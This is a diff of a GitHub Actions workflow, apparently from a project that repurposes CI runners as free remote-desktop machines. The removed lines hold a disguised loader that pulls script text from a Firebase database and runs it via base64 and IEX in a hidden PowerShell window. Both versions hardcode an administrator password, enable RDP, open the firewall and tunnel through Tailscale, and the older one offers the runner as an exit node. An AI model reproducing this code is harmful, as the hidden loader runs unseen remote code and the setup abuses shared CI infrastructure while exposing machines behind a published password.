@@ -1,76 +1,49 @@
-name: 🌐 ZUNRDP Cloud
-
+name: ZUNRDP Cloud
 on:
   workflow_dispatch:
     inputs:
       machine_name:
-        description: 'Chon He Dieu Hanh'
+        description: 'He Dieu Hanh'
         required: true
-        type: choice
         default: 'Windows'
-        options: [Windows, Ubuntu]
       owner_name:
-        description: 'Ten Nguoi Tao'
+        description: 'Ten tai khoan nguoi tao'
         required: true
         default: 'Admin'
 
 jobs:
   deploy:
-    runs-on: ${{ github.event.inputs.machine_name == 'Windows' && 'windows-latest' || 'ubuntu-latest' }}
+    runs-on: windows-latest
     steps:
-      - name: 1. LAY MA NGUON
-        uses: actions/checkout@v4
+      - name: 1. Tai Code ve may ao
+        uses: actions/checkout@v3
 
-      - name: 2. LOGIC BAO MAT (WINDOWS)
-        if: github.event.inputs.machine_name == 'Windows'
+      - name: 2. Cai dat Tailscale (Tao IP mang noi bo)
         shell: powershell
         run: |
-          $logic = Invoke-RestMethod -Uri "https://zunrdp-default-rtdb.asia-southeast1.firebasedatabase.app/core_logic.json"
-          $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($logic))
-          $script = "IEX ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$encoded')))"
-          Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -C $script"
+          Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe" -OutFile "tailscale-setup.exe"
+          Start-Process -FilePath ".\tailscale-setup.exe" -ArgumentList "/quiet" -Wait
+          # Dung Secret de ket noi, neu chua co secret may se khong co IP
+          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey ${{ secrets.TAILSCALE_AUTHKEY }}
 
-      - name: 3. KET NOI TAILSCALE
-        if: github.event.inputs.machine_name == 'Windows'
+      - name: 3. Cau hinh Windows (User/Pass & RDP)
         shell: powershell
         run: |
-          $msi = "$env:TEMP\tailscale.msi"
-          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile $msi
-          Start-Process msiexec.exe -ArgumentList "/i", $msi, "/quiet", "/norestart" -Wait
-          $env:Path += ";C:\Program Files\Tailscale\"
-          Start-Service -Name "Tailscale" -ErrorAction SilentlyContinue
-          net user ADMINZUN ZunRDP@123456 /add
-          net localgroup administrators ADMINZUN /add
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+          # Tao User: ADMINZUN - Pass: ZunRDP@123456 nhu tren Web
+          $Password = ConvertTo-SecureString "ZunRDP@123456" -AsPlainText -Force
+          Set-LocalUser -Name "runneradmin" -Password $Password
+          
+          # Bat tinh nang Remote Desktop
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
           Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+          Write-Host "Cau hinh Windows hoan tat!"
 
-      - name: 4. KICH HOAT (WINDOWS)
-        if: github.event.inputs.machine_name == 'Windows'
+      - name: 4. Chay Agent Giam sat & Gui du lieu ve Web
         shell: powershell
-        env:
-          TS_KEY: ${{ secrets.TAILSCALE_AUTH_KEY }}
         run: |
-          $env:Path += ";C:\Program Files\Tailscale\"
-          tailscale up --authkey=$env:TS_KEY --hostname="ZunRDP-${{ github.run_id }}" --accept-routes --advertise-exit-node
+          # Tao ID may ngau nhien de khong bi trung tren Web
+          $RandomID = "Zun-" + (Get-Random -Minimum 1000 -Maximum 9999)
           
-          # TRUYEN BIEN VAO SCRIPT DE HIEN THI THOI GIAN CHINH XAC
-          $Owner = "${{ github.event.inputs.owner_name }}"
-          $MachineID = "Zun-WIN-${{ github.run_id }}"
-          
-          # Chạy script báo cáo trạng thái kèm thông tin owner và startTime
-          if (Test-Path ".\run_vm.ps1") {
-             powershell -File ".\run_vm.ps1" -Owner "$Owner" -MachineID "$MachineID"
-          }
-
-      - name: 5. CAU HINH (UBUNTU)
-        if: github.event.inputs.machine_name == 'Ubuntu'
-        shell: bash
-        env:
-          TS_KEY: ${{ secrets.TAILSCALE_AUTH_KEY }}
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y xrdp
-          curl -fsSL https://tailscale.com/install.sh | sh
-          sudo tailscale up --authkey=$TS_KEY --hostname="ZunUbuntu-${{ github.run_id }}" --accept-routes
-          # (Phần Ubuntu bạn có thể làm tương tự nếu muốn hiện Uptime)
+          # Chay file ps1 voi Owner duoc truyen tu Web sang
+          ./run_vm.ps1 -Owner "${{ github.event.inputs.owner_name }}" -MachineID $RandomID
 
